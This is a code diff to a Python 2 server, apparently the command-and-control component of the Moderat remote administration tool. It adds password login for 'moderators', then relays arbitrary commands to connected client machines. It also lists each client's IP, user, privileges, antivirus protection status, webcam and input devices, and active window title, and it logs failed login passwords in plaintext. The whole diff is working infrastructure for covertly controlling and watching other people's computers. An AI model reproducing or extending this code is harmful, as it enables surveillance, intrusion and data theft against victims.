@@ -7,7 +7,7 @@ import time
 import random
 import string
 from modechat import *
-
+from ModeratorsManagment import ModeratorsManagment
 CLIENT_PORT = 4434
 MODERATOR_PORT = 1313
 MAX_CONNECTIONS = 6400
@@ -20,6 +20,9 @@ def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
 class ModeratServer:
 
     def __init__(self):
+
+        # Init Database
+        self.db = ModeratorsManagment()
 
         # connection accept threads state
         self.accept_thread_state = False
@@ -157,55 +160,68 @@ class ModeratServer:
         self.moderator_socket.listen(MAX_CONNECTIONS)
 
         while self.accept_thread_state:
-
             try:
                 self.moderator_sock, self.moderator_address = self.moderator_socket.accept()
             except:
                 continue
 
             if self.moderator_sock:
-                print '[+] New Moderator Connected (%s(%s))' % (self.moderator_address[0], self.moderator_address[1])
                 self.moderator_threads[self.moderator_address[1]] = threading.Thread(target=self.moderator_listener, args=(self.moderator_sock, self.moderator_address[1]))
                 self.moderator_threads[self.moderator_address[1]].start()
-
 
     def moderator_listener(self, sock, socket_id):
         while 1:
             try:
                 client_socket, data = moderator_receive(sock)
-                if data == 'getClients':
-                    output = self.command_get_clients()
+                if data.startswith('auth '):
+                    try:
+                        command, username, password = data.split()
+                        if ModeratorsManagment().login_user(username, password):
+                            print '[+] Login Success For Moderator (%s)' % username
+                            moderator_send(sock, 'LoginSuccess', client_socket)
+                            while 1:
+                                try:
+                                    client_socket, data = moderator_receive(sock)
+                                    print data
+                                    if data == 'getClients':
+                                        output = self.command_get_clients()
+                                    else:
+                                        output = self.command_all(data, client_socket)
+                                    moderator_send(sock, output, client_socket)
+                                except socket.error:
+                                    print '[-] Socket Error'
+                                    break
+                        else:
+                            print '[!] Login Failed With (%s, %s)' % (username, password)
+                            moderator_send(sock, 'LoginError', client_socket)
+                    except Exception as e:
+                        print e
+                        continue
                 else:
-                    output = self.command_all(data, client_socket)
-                    print output
-                moderator_send(sock, output, client_socket)
+                    moderator_send(sock, 'AuthError', client_socket)
             except socket.error:
                 print '[-] Socket Error'
                 return
             time.sleep(3)
 
-
     # Moderator Commands
     def command_get_clients(self):
         for i, k in self.socks.iteritems():
-            print i
             self.shared_socks[i] = {
-                'a': 'b'
+                'ip_address': self.socks[i]['ip_address'],
+                'socket': self.socks[i]['socket'],
+                'ostype': self.socks[i]['ostype'],
+                'protection': self.streaming_socks[i]['protection'],
+                'os': self.socks[i]['os'],
+                'user': self.socks[i]['user'],
+                'privileges': self.streaming_socks[i]['privileges'],
+                'inputdevice': self.socks[i]['inputdevice'],
+                'webcamdevice': self.socks[i]['webcamdevice'],
+                'activewindowtitle': self.streaming_socks[i]['activewindowtitle'],
             }
-            self.shared_socks[i]['ip_address'] = self.socks[i]['ip_address']
-            self.shared_socks[i]['socket'] = self.socks[i]['socket']
-            self.shared_socks[i]['ostype'] = self.socks[i]['ostype']
-            self.shared_socks[i]['protection'] = self.streaming_socks[i]['protection']
-            self.shared_socks[i]['os'] = self.socks[i]['os']
-            self.shared_socks[i]['user'] = self.socks[i]['user']
-            self.shared_socks[i]['privileges'] = self.streaming_socks[i]['privileges']
-            self.shared_socks[i]['inputdevice'] = self.socks[i]['inputdevice']
-            self.shared_socks[i]['webcamdevice'] = self.socks[i]['webcamdevice']
-            self.shared_socks[i]['activewindowtitle'] = self.streaming_socks[i]['activewindowtitle']
         return str(self.shared_socks)
 
     def command_all(self, payload, client_socket):
-        print client_socket
         return client_get(self.socks[int(client_socket)]['sock'], payload, client_socket)
 
 
